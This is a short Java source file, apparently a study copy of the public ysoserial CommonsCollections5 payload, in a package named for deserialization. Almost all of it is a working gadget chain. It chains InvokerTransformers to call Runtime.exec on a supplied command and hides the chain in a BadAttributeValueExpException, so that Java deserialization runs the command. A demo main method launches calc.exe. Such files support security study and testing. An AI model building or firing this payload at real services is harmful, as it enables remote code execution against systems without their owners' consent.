package fanxulie;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

class CommonsCollectionsa  {
    public CommonsCollectionsa() {
    }

    public static BadAttributeValueExpException getObject(String command) throws Exception {
        String[] execArgs = new String[]{command};
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        BadAttributeValueExpException val = new BadAttributeValueExpException((Object)null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
//        System.out.println(val);
        return val;
    }

    public static void main(String args[]) throws Exception {
        //getObject("calc.exe");
        System.out.println(getObject("calc.exe"));
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}